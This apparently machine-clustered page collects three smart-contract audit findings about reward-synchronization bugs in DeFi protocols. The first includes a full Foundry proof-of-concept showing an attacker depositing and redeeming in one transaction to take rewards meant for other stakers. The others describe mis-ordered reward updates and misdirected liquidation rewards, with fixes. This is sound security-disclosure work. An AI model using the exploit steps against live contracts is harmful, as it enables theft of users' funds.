# Cluster -1427

**Rank:** #427  
**Count:** 10  

## Label
Improper reward or state synchronization during critical operations enables attackers to manipulate rewards, inflate stakes, or freeze scores, leading to unfair advantage, inaccurate calculations, and denial-of-service.

## Cluster Information
- **Total Findings:** 10

## Examples

### Example 1

**Auto Label:** Race conditions and improper state sequencing enable attackers to harvest or steal rewards by exploiting timing flaws in balance updates and reward distributions.  

**Original Text Preview:**

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/233 

## Found by 
Schnilch, ZoA, silver\_eth

### Summary

Since the rewards from TokenRewards are not distributed in `_processRewardsToPodLp`, an attacker can deposit into AutoCompoundingPodLp in a single transaction, then distribute the rewards, and subsequently withdraw, receiving a portion of the rewards that were not intended for them.

### Root Cause

AutoCompoundingPodLp uses `_processRewardsToPodLp` to convert (compound) the rewards it receives from the TokenRewards contract into spTKNs. The problem here is that at the beginning of this function, the rewards from TokenRewards are not distributed, which can lead to these rewards being compounded too late.
https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/AutoCompoundingPodLp.sol#L213-L231
In this code snippet, you can see that rewards are not distributed anywhere in the function.

The important point here is that if there is more than one rewards token, rewards are distributed, because `_tokenToPodLp` is called for the tokens with a non-zero balance. Since `_tokenToPodLp` converts the reward token into `spTKN`, rewards are distributed because when `spTKN` is sent to `AutoCompoundingPodLp`, `setShares` in `TokenRewards` is triggered, which then distributes the rewards:
https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/TokenRewards.sol#L113-L116
In this case, the rewards are indeed in AutoCompoundingPodLp, but since `_tokenToPodLp` has already been called for some reward tokens, not all of these rewards are immediately compounded. This leads to some rewards remaining in AutoCompoundingPodLp, which can be stolen by an attacker.

But if there are no rewards (`_bal` of all reward tokens is 0) in the AutoCompoundingLp at all, distribute will not be called, even if there are multiple reward tokens, because `_tokenToPodLp` simply would not be called since there is nothing to compound.

### Internal Pre-conditions

1. TokenRewards must have some rewards for an attacker to be able to steal them

### External Pre-conditions

No external pre-conditions

### Attack Path

1. It is assumed that there are rewards in TokenRewards for AutoCompoundingPodLp that have not yet been distributed. Currently, there are no rewards in AutoCompoundingPodLp.
2. An attacker sees this and now deposits spTKN into AutoCompoundingPodLp. Since there are no tokens in Auto Compounding PdLp, the rewards are only distributed when the spTKNs deposited by the attacker are transferred at the end of the function, because this is when `setShares` is called, and thus rewards are distributed.
3. In the same transaction, he calls redeem, which, through `_processRewardsToPodLp`, causes the rewards to be compounded into spTKNs. As a result, the rewards are then in the contract as spTKNs, and upon redeeming, he receives a portion of the rewards and has more spTKNs than at the beginning.

### Impact

An attacker can steal rewards from AutoCompoundingPodLp that are actually meant for users who stake their spTKNs there. As a result, these users receive fewer rewards.

### PoC

1. To execute the POC, a `POC.t.sol` file should be created in `contracts/test/POC.t.sol`.
2. The following code should be inserted into the file:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {console} from "forge-std/console.sol";

// forge
import {Test} from "forge-std/Test.sol";

// PEAS
import {PEAS} from "../../contracts/PEAS.sol";
import {V3TwapUtilities} from "../../contracts/twaputils/V3TwapUtilities.sol";
import {UniswapDexAdapter} from "../../contracts/dex/UniswapDexAdapter.sol";
import {IDecentralizedIndex} from "../../contracts/interfaces/IDecentralizedIndex.sol";
import {WeightedIndex} from "../../contracts/WeightedIndex.sol";
import {StakingPoolToken} from "../../contracts/StakingPoolToken.sol";
import {LendingAssetVault} from "../../contracts/LendingAssetVault.sol";
import {IndexUtils} from "../../contracts/IndexUtils.sol";
import {IIndexUtils} from "../../contracts/interfaces/IIndexUtils.sol";
import {IndexUtils} from "../contracts/IndexUtils.sol";
import {RewardsWhitelist} from "../../contracts/RewardsWhitelist.sol";
import {TokenRewards} from "../../contracts/TokenRewards.sol";

// oracles
import {ChainlinkSinglePriceOracle} from "../../contracts/oracle/ChainlinkSinglePriceOracle.sol";
import {UniswapV3SinglePriceOracle} from "../../contracts/oracle/UniswapV3SinglePriceOracle.sol";
import {DIAOracleV2SinglePriceOracle} from "../../contracts/oracle/DIAOracleV2SinglePriceOracle.sol";
import {V2ReservesUniswap} from "../../contracts/oracle/V2ReservesUniswap.sol";
import {aspTKNMinimalOracle} from "../../contracts/oracle/aspTKNMinimalOracle.sol";

// protocol fees
import {ProtocolFees} from "../../contracts/ProtocolFees.sol";
import {ProtocolFeeRouter} from "../../contracts/ProtocolFeeRouter.sol";

// autocompounding
import {AutoCompoundingPodLpFactory} from "../../contracts/AutoCompoundingPodLpFactory.sol";
import {AutoCompoundingPodLp} from "../../contracts/AutoCompoundingPodLp.sol";

// lvf
import {LeverageManager} from "../../contracts/lvf/LeverageManager.sol";

// fraxlend
import {FraxlendPairDeployer, ConstructorParams} from "./invariant/modules/fraxlend/FraxlendPairDeployer.sol";
import {FraxlendWhitelist} from "./invariant/modules/fraxlend/FraxlendWhitelist.sol";
import {FraxlendPairRegistry} from "./invariant/modules/fraxlend/FraxlendPairRegistry.sol";
import {FraxlendPair} from "./invariant/modules/fraxlend/FraxlendPair.sol";
import {VariableInterestRate} from "./invariant/modules/fraxlend/VariableInterestRate.sol";
import {IERC4626Extended} from "./invariant/modules/fraxlend/interfaces/IERC4626Extended.sol";

// flash
import {IVault} from "./invariant/modules/balancer/interfaces/IVault.sol";
import {BalancerFlashSource} from "../../contracts/flash/BalancerFlashSource.sol";
import {PodFlashSource} from "../../contracts/flash/PodFlashSource.sol";
import {UniswapV3FlashSource} from "../../contracts/flash/UniswapV3FlashSource.sol";

// uniswap-v2-core
import {UniswapV2Factory} from "v2-core/UniswapV2Factory.sol";
import {UniswapV2Pair} from "v2-core/UniswapV2Pair.sol";

// uniswap-v2-periphery
import {UniswapV2Router02} from "v2-periphery/UniswapV2Router02.sol";

// uniswap-v3-core
import {UniswapV3Factory} from "v3-core/UniswapV3Factory.sol";
import {UniswapV3Pool} from "v3-core/UniswapV3Pool.sol";

// uniswap-v3-periphery
import {SwapRouter02} from "swap-router/SwapRouter02.sol";
import {LiquidityManagement} from "v3-periphery/base/LiquidityManagement.sol";
import {PeripheryPayments} from "v3-periphery/base/PeripheryPayments.sol";
import {PoolAddress} from "v3-periphery/libraries/PoolAddress.sol";

// mocks
import {WETH9} from "./invariant/mocks/WETH.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {MockERC20} from "./invariant/mocks/MockERC20.sol";
import {TestERC20} from "./invariant/mocks/TestERC20.sol";
import {TestERC4626Vault} from "./invariant/mocks/TestERC4626Vault.sol";
import {MockV3Aggregator} from "./invariant/mocks/MockV3Aggregator.sol";
import {MockUniV3Minter} from "./invariant/mocks/MockUniV3Minter.sol";
import {MockV3TwapUtilities} from "./invariant/mocks/MockV3TwapUtilities.sol";

import {PodHelperTest} from "./helpers/PodHelper.t.sol";

contract AuditTests is PodHelperTest {
    address alice = vm.addr(uint256(keccak256("alice")));
    address bob = vm.addr(uint256(keccak256("bob")));
    address charlie = vm.addr(uint256(keccak256("charlie")));

    uint256[] internal _fraxPercentages = [10000, 2500, 7500, 5000];

    // fraxlend protocol actors
    address internal comptroller = vm.addr(uint256(keccak256("comptroller")));
    address internal circuitBreaker = vm.addr(uint256(keccak256("circuitBreaker")));
    address internal timelock = vm.addr(uint256(keccak256("comptroller")));

    uint16 internal fee = 100;
    uint256 internal PRECISION = 10 ** 27;

    uint256 donatedAmount;
    uint256 lavDeposits;

    /*///////////////////////////////////////////////////////////////
                            TEST CONTRACTS
    ///////////////////////////////////////////////////////////////*/

    PEAS internal _peas;
    MockV3TwapUtilities internal _twapUtils;
    UniswapDexAdapter internal _dexAdapter;
    LendingAssetVault internal _lendingAssetVault;
    LendingAssetVault internal _lendingAssetVault2;
    RewardsWhitelist internal _rewardsWhitelist;

    // oracles
    V2ReservesUniswap internal _v2Res;
    ChainlinkSinglePriceOracle internal _clOracle;
    UniswapV3SinglePriceOracle internal _uniOracle;
    DIAOracleV2SinglePriceOracle internal _diaOracle;
    aspTKNMinimalOracle internal _aspTKNMinOracle1Peas;
    aspTKNMinimalOracle internal _aspTKNMinOracle1Weth;

    // protocol fees
    ProtocolFees internal _protocolFees;
    ProtocolFeeRouter internal _protocolFeeRouter;

    // pods
    WeightedIndex internal _pod1Peas;

    // index utils
    IndexUtils internal _indexUtils;

    // autocompounding
    AutoCompoundingPodLpFactory internal _aspTKNFactory;
    AutoCompoundingPodLp internal _aspTKN1Peas;
    address internal _aspTKN1PeasAddress;

    // lvf
    LeverageManager internal _leverageManager;

    // fraxlend
    FraxlendPairDeployer internal _fraxDeployer;
    FraxlendWhitelist internal _fraxWhitelist;
    FraxlendPairRegistry internal _fraxRegistry;
    VariableInterestRate internal _variableInterestRate;

    FraxlendPair internal _fraxLPToken1Peas;

    // flash
    UniswapV3FlashSource internal _uniswapV3FlashSourcePeas;

    // mocks
    MockUniV3Minter internal _uniV3Minter;
    MockERC20 internal _mockDai;
    WETH9 internal _weth;
    MockERC20 internal _tokenA;
    MockERC20 internal _tokenB;
    MockERC20 internal _tokenC;

    // uniswap-v2-core
    UniswapV2Factory internal _uniV2Factory;
    UniswapV2Pair internal _uniV2Pool;

    // uniswap-v2-periphery
    UniswapV2Router02 internal _v2SwapRouter;

    // uniswap-v3-core
    UniswapV3Factory internal _uniV3Factory;
    UniswapV3Pool internal _v3peasDaiPool;
    UniswapV3Pool internal _v3peasDaiFlash;

    // uniswap-v3-periphery
    SwapRouter02 internal _v3SwapRouter;

    function setUp() public override {
        super.setUp();

        _deployUniV3Minter();
        _deployWETH();
        _deployTokens();
        _deployPEAS();
        _deployUniV2();
        _deployUniV3();
        _deployProtocolFees();
        _deployRewardsWhitelist();
        _deployTwapUtils();
        _deployDexAdapter();
        _deployIndexUtils();
        _deployWeightedIndexes();
        _deployAutoCompoundingPodLpFactory();
        _getAutoCompoundingPodLpAddresses();
        _deployAspTKNOracles();
        _deployAspTKNs();
        _deployVariableInterestRate();
        _deployFraxWhitelist();
        _deployFraxPairRegistry();
        _deployFraxPairDeployer();
        _deployFraxPairs();
        _deployLendingAssetVault();
        _deployLeverageManager();
        _deployFlashSources();
        
        _mockDai.mint(alice, 1_000_000 ether);
        _mockDai.mint(bob, 1_000_000 ether);
        _mockDai.mint(charlie, 1_000_000 ether);
        _peas.transfer(alice, 100_000 ether);
        _peas.transfer(bob, 100_000 ether);
        _peas.transfer(charlie, 100_000 ether);
    }

    function _deployUniV3Minter() internal {
        _uniV3Minter = new MockUniV3Minter();
    }

    function _deployWETH() internal {
        _weth = new WETH9();

        vm.deal(address(this), 1_000_000 ether);
        _weth.deposit{value: 1_000_000 ether}();

        vm.deal(address(_uniV3Minter), 2_000_000 ether);
        vm.prank(address(_uniV3Minter));
        _weth.deposit{value: 2_000_000 ether}();
    }

    function _deployTokens() internal {
        _mockDai = new MockERC20();
        _tokenA = new MockERC20();
        _tokenB = new MockERC20();
        _tokenC = new MockERC20();

        _mockDai.initialize("MockDAI", "mDAI", 18);
        _tokenA.initialize("TokenA", "TA", 18);
        _tokenB.initialize("TokenB", "TB", 18);
        _tokenC.initialize("TokenC", "TC", 18);

        _tokenA.mint(address(this), 1_000_000 ether);
        _tokenB.mint(address(this), 1_000_000 ether);
        _tokenC.mint(address(this), 1_000_000 ether);
        _mockDai.mint(address(this), 1_000_000 ether);

        _tokenA.mint(address(_uniV3Minter), 1_000_000 ether);
        _tokenB.mint(address(_uniV3Minter), 1_000_000 ether);
        _tokenC.mint(address(_uniV3Minter), 1_000_000 ether);
        _mockDai.mint(address(_uniV3Minter), 1_000_000 ether);

        _tokenA.mint(alice, 1_000_000 ether);
        _tokenB.mint(alice, 1_000_000 ether);
        _tokenC.mint(alice, 1_000_000 ether);
        _mockDai.mint(alice, 1_000_000 ether);

        _tokenA.mint(bob, 1_000_000 ether);
        _tokenB.mint(bob, 1_000_000 ether);
        _tokenC.mint(bob, 1_000_000 ether);
        _mockDai.mint(bob, 1_000_000 ether);

        _tokenA.mint(charlie, 1_000_000 ether);
        _tokenB.mint(charlie, 1_000_000 ether);
        _tokenC.mint(charlie, 1_000_000 ether);
        _mockDai.mint(charlie, 1_000_000 ether);
    }

    function _deployPEAS() internal {
        _peas = new PEAS("Peapods", "PEAS");
        _peas.transfer(address(_uniV3Minter), 2_000_000 ether);
    }

    function _deployUniV2() internal {
        _uniV2Factory = new UniswapV2Factory(address(this));
        _v2SwapRouter = new UniswapV2Router02(address(_uniV2Factory), address(_weth));
    }

    function _deployUniV3() internal {
        _uniV3Factory = new UniswapV3Factory();
        _v3peasDaiPool = UniswapV3Pool(_uniV3Factory.createPool(address(_peas), address(_mockDai), 10_000));
        _v3peasDaiPool.initialize(1 << 96);
        _v3peasDaiPool.increaseObservationCardinalityNext(600);
        _uniV3Minter.V3addLiquidity(_v3peasDaiPool, 100_000 ether);

        _v3peasDaiFlash = UniswapV3Pool(_uniV3Factory.createPool(address(_peas), address(_mockDai), 500));
        _v3peasDaiFlash.initialize(1 << 96);
        _v3peasDaiFlash.increaseObservationCardinalityNext(600);
        _uniV3Minter.V3addLiquidity(_v3peasDaiFlash, 100_000e18);

        _v3SwapRouter = new SwapRouter02(address(_uniV2Factory), address(_uniV3Factory), address(0), address(_weth));
    }

    function _deployProtocolFees() internal {
        _protocolFees = new ProtocolFees();
        _protocolFees.setYieldAdmin(500);
        _protocolFees.setYieldBurn(500);

        _protocolFeeRouter = new ProtocolFeeRouter(_protocolFees);
        bytes memory code = address(_protocolFeeRouter).code;
        vm.etch(0x7d544DD34ABbE24C8832db27820Ff53C151e949b, code);
        _protocolFeeRouter = ProtocolFeeRouter(0x7d544DD34ABbE24C8832db27820Ff53C151e949b);

        vm.prank(_protocolFeeRouter.owner());
        _protocolFeeRouter.transferOwnership(address(this));
        _protocolFeeRouter.setProtocolFees(_protocolFees);
    }

    function _deployRewardsWhitelist() internal {
        _rewardsWhitelist = new RewardsWhitelist();
        bytes memory code = address(_rewardsWhitelist).code;
        vm.etch(0xEc0Eb48d2D638f241c1a7F109e38ef2901E9450F, code);
        _rewardsWhitelist = RewardsWhitelist(0xEc0Eb48d2D638f241c1a7F109e38ef2901E9450F);

        vm.prank(_rewardsWhitelist.owner());
        _rewardsWhitelist.transferOwnership(address(this));
        _rewardsWhitelist.toggleRewardsToken(address(_peas), true);
    }

    function _deployTwapUtils() internal {
        _twapUtils = new MockV3TwapUtilities();
        bytes memory code = address(_twapUtils).code;
        vm.etch(0x024ff47D552cB222b265D68C7aeB26E586D5229D, code);
        _twapUtils = MockV3TwapUtilities(0x024ff47D552cB222b265D68C7aeB26E586D5229D);
    }

    function _deployDexAdapter() internal {
        _dexAdapter = new UniswapDexAdapter(_twapUtils, address(_v2SwapRouter), address(_v3SwapRouter), false);
    }

    function _deployIndexUtils() internal {
        _indexUtils = new IndexUtils(_twapUtils, _dexAdapter);
    }

    function _deployWeightedIndexes() internal {
        IDecentralizedIndex.Config memory _c;
        IDecentralizedIndex.Fees memory _f;
        _f.bond = 300;
        _f.debond = 300;
        _f.burn = 5000;
        //_f.sell = 200;
        _f.buy = 200;

        // POD1 (Peas)
        address[] memory _t1 = new address[](1);
        _t1[0] = address(_peas);
        uint256[] memory _w1 = new uint256[](1);
        _w1[0] = 100;
        address __pod1Peas = _createPod(
            "Peas Pod",
            "pPeas",
            _c,
            _f,
            _t1,
            _w1,
            address(0),
            false,
            abi.encode(
                address(_mockDai),
                address(_peas),
                address(_mockDai),
                address(_protocolFeeRouter),
                address(_rewardsWhitelist),
                address(_twapUtils),
                address(_dexAdapter)
            )
        );
        _pod1Peas = WeightedIndex(payable(__pod1Peas));

        _peas.approve(address(_pod1Peas), 100_000 ether);
        _mockDai.approve(address(_pod1Peas), 100_000 ether);
        _pod1Peas.bond(address(_peas), 100_000 ether, 1 ether);
        _pod1Peas.addLiquidityV2(100_000 ether, 100_000 ether, 100, block.timestamp);
    }

    function _deployAutoCompoundingPodLpFactory() internal {
        _aspTKNFactory = new AutoCompoundingPodLpFactory();
    }
    
    function _getAutoCompoundingPodLpAddresses() internal {
        _aspTKN1PeasAddress = _aspTKNFactory.getNewCaFromParams(
            "Test aspTKN1Peas", "aspTKN1Peas", false, _pod1Peas, _dexAdapter, _indexUtils, 0
        );
    }

    function _deployAspTKNOracles() internal {
        _v2Res = new V2ReservesUniswap();
        _clOracle = new ChainlinkSinglePriceOracle(address(0));
        _uniOracle = new UniswapV3SinglePriceOracle(address(0));
        _diaOracle = new DIAOracleV2SinglePriceOracle(address(0));

        _aspTKNMinOracle1Peas = new aspTKNMinimalOracle(
            address(_aspTKN1PeasAddress),
            abi.encode(
                address(_clOracle),
                address(_uniOracle),
                address(_diaOracle),
                address(_mockDai),
                false,
                false,
                _pod1Peas.lpStakingPool(),
                address(_v3peasDaiPool)
            ),
            abi.encode(address(0), address(0), address(0), address(0), address(0), address(_v2Res))
        );
    }

    function _deployAspTKNs() internal {
        //POD 1
        address _lpPeas = _pod1Peas.lpStakingPool();
        address _stakingPeas = StakingPoolToken(_lpPeas).stakingToken();

        IERC20(_stakingPeas).approve(_lpPeas, 500e18);
        StakingPoolToken(_lpPeas).stake(address(this), 500e18);
        IERC20(_lpPeas).approve(address(_aspTKNFactory), 500e18);

        _aspTKNFactory.create("Test aspTKN1Peas", "aspTKN1Peas", false, _pod1Peas, _dexAdapter, _indexUtils, 0);
        _aspTKN1Peas = AutoCompoundingPodLp(_aspTKN1PeasAddress);

        IERC20(_lpPeas).approve(address(_aspTKN1Peas), 400e18);
        _aspTKN1Peas.deposit(400e18, address(this));
    }

    function _deployVariableInterestRate() internal {
        _variableInterestRate = new VariableInterestRate(
            "[0.5 0.2@.875 5-10k] 2 days (.75-.85)",
            87500,
            200000000000000000,
            75000,
            85000,
            158247046,
            1582470460,
            3164940920000,
            172800
        );
    }

    function _deployFraxWhitelist() internal {
        _fraxWhitelist = new FraxlendWhitelist();
    }

    function _deployFraxPairRegistry() internal {
        address[] memory _initialDeployers = new address[](0);
        _fraxRegistry = new FraxlendPairRegistry(address(this), _initialDeployers);
    }

    function _deployFraxPairDeployer() internal {
        ConstructorParams memory _params =
            ConstructorParams(circuitBreaker, comptroller, timelock, address(_fraxWhitelist), address(_fraxRegistry));
        _fraxDeployer = new FraxlendPairDeployer(_params);

        _fraxDeployer.setCreationCode(type(FraxlendPair).creationCode);

        address[] memory _whitelistDeployer = new address[](1);
        _whitelistDeployer[0] = address(this);

        _fraxWhitelist.setFraxlendDeployerWhitelist(_whitelistDeployer, true);

        address[] memory _registryDeployer = new address[](1);
        _registryDeployer[0] = address(_fraxDeployer);

        _fraxRegistry.setDeployers(_registryDeployer, true);
    }

    function _deployFraxPairs() internal {
        vm.warp(block.timestamp + 1 days);

        _fraxLPToken1Peas = FraxlendPair(
            _fraxDeployer.deploy(
                abi.encode(
                    _pod1Peas.PAIRED_LP_TOKEN(), // asset
                    _aspTKN1PeasAddress, // collateral
                    address(_aspTKNMinOracle1Peas), //oracle
                    5000, // maxOracleDeviation
                    address(_variableInterestRate), //rateContract
                    1000, //fullUtilizationRate
                    75000, // maxLtv
                    10000, // uint256 _cleanLiquidationFee
                    9000, // uint256 _dirtyLiquidationFee
                    2000 //uint256 _protocolLiquidationFee
                )
            )
        );
    }

    function _deployLendingAssetVault() internal {
        _lendingAssetVault = new LendingAssetVault("Test LAV", "tLAV", address(_mockDai));
        IERC20 vaultAsset1Peas = IERC20(_fraxLPToken1Peas.asset());
        vaultAsset1Peas.approve(address(_fraxLPToken1Peas), vaultAsset1Peas.totalSupply());
        vaultAsset1Peas.approve(address(_lendingAssetVault), vaultAsset1Peas.totalSupply());
        _lendingAssetVault.setVaultWhitelist(address(_fraxLPToken1Peas), true);

        address[] memory _vaults = new address[](1);
        _vaults[0] = address(_fraxLPToken1Peas);
        uint256[] memory _allocations = new uint256[](1);
        _allocations[0] = 100_000e18;
        _lendingAssetVault.setVaultMaxAllocation(_vaults, _allocations);

        vm.prank(timelock);
        _fraxLPToken1Peas.setExternalAssetVault(IERC4626Extended(address(_lendingAssetVault)));
    }

    function _deployLeverageManager() internal {
        _leverageManager = new LeverageManager("Test LM", "tLM", IIndexUtils(address(_indexUtils)));
        _leverageManager.setLendingPair(address(_pod1Peas), address(_fraxLPToken1Peas));
    }

    function _deployFlashSources() internal {
        _uniswapV3FlashSourcePeas = new UniswapV3FlashSource(address(_v3peasDaiFlash), address(_leverageManager));
        _leverageManager.setFlashSource(address(_pod1Peas.PAIRED_LP_TOKEN()), address(_uniswapV3FlashSourcePeas));
    }

    function testPoc() public {
        UniswapV2Pair _v2Pool = UniswapV2Pair(_pod1Peas.DEX_HANDLER().getV2Pool(address(_pod1Peas), address(_mockDai)));
        StakingPoolToken _spTKN = StakingPoolToken(_pod1Peas.lpStakingPool());
        TokenRewards _tokenRewards = TokenRewards(_spTKN.POOL_REWARDS());

        vm.startPrank(alice);
        console.log("\n====== Alice bonds 10_000 PEAS ======"); //Alice bonds 10_000 peas to create fees which then come as rewards in TokenRewards
        _peas.approve(address(_pod1Peas), 10_000e18);
        _pod1Peas.bond(address(_peas), 10_000e18, 0);
        vm.stopPrank();

        vm.startPrank(bob); //Bob sees this and wants to steal the rewards
        console.log("\n====== Bob bonds 1000 PEAS ======");
        _peas.approve(address(_pod1Peas), 1000e18);
        _pod1Peas.bond(address(_peas), 1000e18, 0); //Because Bob, to steal the rewards, needs spTKNs, he first needs to bond his Peas

        console.log("\n====== Bob adds 950 liquidity ======");
        _mockDai.approve(address(_pod1Peas), 950e18);
        _pod1Peas.addLiquidityV2( //Then he adds liquidity to get the LP tokens
            950e18,
            950e18,
            1000,
            block.timestamp
        );

        console.log("\n====== Bob stakes 950 lp ======");
        _v2Pool.approve(address(_spTKN), 950e18);
        _spTKN.stake(bob, 950e18); //The rewards from the pod are transferred to TokenRewards during staking because setShares is called when transfering the spTKNs
    
        console.log("\n====== Bob deposits 950 spTKNs ======");
        console.log("bob _spTKN before: ", _spTKN.balanceOf(bob));
        console.log("rewards in TokenRewards before: ", _peas.balanceOf(address(_tokenRewards)));
        console.log("rewards in AutoCompoundingPodLp before: ", _peas.balanceOf(address(_aspTKN1Peas)));
        _spTKN.approve(address(_aspTKN1Peas), 950e18);
        _aspTKN1Peas.deposit(950e18, bob);
        //This shows that the rewards from TokenRewards were transferred to AutoCompoundingLp but have not yet been compounded, allowing the attacker, who now also has aspTKNs, to receive a part of these rewards
        console.log("rewards in TokenRewards after: ", _peas.balanceOf(address(_tokenRewards)));
        console.log("rewards in AutoCompoundingPodLp after: ", _peas.balanceOf(address(_aspTKN1Peas)));

        console.log("\n====== Bob redeems 950 aspTKNs ======");
        _aspTKN1Peas.redeem(950e18, bob, bob);
        //If you subtract the spTKN balance that the attacker had before the attack, you can see that he now has more tokens
        console.log("bob _spTKN after: ", _spTKN.balanceOf(bob));

        //This shows that there are still some spTKNs as rewards, but there should actually be more because the attacker shouldn't have gotten any
        //The remaining rewards are for the account that has already been deposited into the aspTKN in the setup (see _deployAspTKNs in line 400)
        console.log("_aspTKN spTKN balance: ", _spTKN.balanceOf(address(_aspTKN1Peas)));
        vm.stopPrank();
    }
}
```
3. The POC can then be started with `forge test --mt testPoc -vv --fork-url <FORK_URL>`

---
### Example 2

**Auto Label:** Improper reward or state synchronization during critical operations enables attackers to manipulate rewards, inflate stakes, or freeze scores, leading to unfair advantage, inaccurate calculations, and denial-of-service.  

**Original Text Preview:**

Source: https://github.com/sherlock-audit/2024-05-elfi-protocol-judging/issues/274 

## Found by 
Cosine, aman, jennifer37, mstpr-brainbot, pashap9990
## Summary
When users redeem their stakeToken's their balance decreases hence right before the redeem request the rewards should be synced. However, the code does the opposite which leads to wrong accrual of rewards.
## Vulnerability Detail
As we can see in `RedeemProcess::executeRedeemStakeToken()`, after the burning of the tokens, the rewards are updated:
```solidity
function executeRedeemStakeToken(uint256 requestId, Redeem.Request memory redeemRequest) external {
        uint256 redeemAmount;
        if (CommonData.getStakeUsdToken() == redeemRequest.stakeToken) {
            redeemAmount = _redeemStakeUsd(redeemRequest);
        } else if (CommonData.isStakeTokenSupport(redeemRequest.stakeToken)) {
            redeemAmount = _redeemStakeToken(redeemRequest);
        } else {
            revert Errors.StakeTokenInvalid(redeemRequest.stakeToken);
        }

        -> FeeRewardsProcess.updateAccountFeeRewards(redeemRequest.account, redeemRequest.stakeToken);
        .
    }
```

However, this approach is incorrect. The actual flow should be to update the account's fee rewards right before the burn to sync the account with its latest accrued rewards. Once this is done and the burn is completed, there is no need to update the account's fee rewards again since the next time the user interacts, the fee rewards will be synced, similar to the typical Masterchef contract approach.
## Impact
Unfair accrual of rewards, high.
## Code Snippet
https://github.com/sherlock-audit/2024-05-elfi-protocol/blob/8a1a01804a7de7f73a04d794bf6b8104528681ad/elfi-perp-contracts/contracts/process/RedeemProcess.sol#L68C5-L83C6
## Tool used

Manual Review

## Recommendation
Accrue the rewards in the beginning function 



## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/0xCedar/elfi-perp-contracts/pull/29

---
### Example 3

**Auto Label:** Race conditions and improper state sequencing enable attackers to harvest or steal rewards by exploiting timing flaws in balance updates and reward distributions.  

**Original Text Preview:**

<https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L1078-L1080>

### Vulnerability details

When performing liquidation the liquidator will fill the `LiquidateParams` containing the liquidation details. The issue here is that instead of sending the liquidation rewards to the `LiquidateParams.recipient`, the rewards will be sent to `msg.sender`.

### Impact

The liquidation rewards will be sent to `msg.sender` instead of the recipient, any external logic that relies on the fact that the liquidation rewards will be sent to recipient won't hold; this will influence the protocol's composability.

### Proof of Concept

In order to keep the system safe the liquidator can and is incentivised to liquidate unhealthy positions. To do so the `liquidate()` function will be fired with the appropriate parameters.
One of those parameters is the `address recipient;`; the name is quite intuitive for this one, this is where the liquidation rewards are expected to sent.

But if we follow the `liquidation()` function logic, the rewards will not be sent to recipient address. This [piece of code](https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L741-L742) handles the reward distribution.

    (amount0, amount1) =
                _sendPositionValue(params.tokenId, state.liquidationValue, 
    @>  state.fullValue, state.feeValue, msg.sender); 

We can see that `msg.sender` is being used instead of `params.recipient`.

### Recommended Mitigation Steps

The mitigation is straight forward. Use `params.recipient` instead of `msg.sender` for that specific call.

```diff

     (amount0, amount1) =
            _sendPositionValue(params.tokenId, state.liquidationValue, 
 --    state.fullValue, state.feeValue, msg.sender); 
 ++    state.fullValue, state.feeValue, params.recipient); 
```

### Assessed type

Context

**[kalinbas (Revert) confirmed](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/389#issuecomment-2030514150)**

**[Revert mitigated](https://github.com/code-423n4/2024-04-revert-mitigation?tab=readme-ov-file#scope):**
> Fixed [here](https://github.com/revert-finance/lend/pull/20).

**Status:** Mitigation confirmed. Full details in reports from [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/31), [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/86) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/15).

***

---
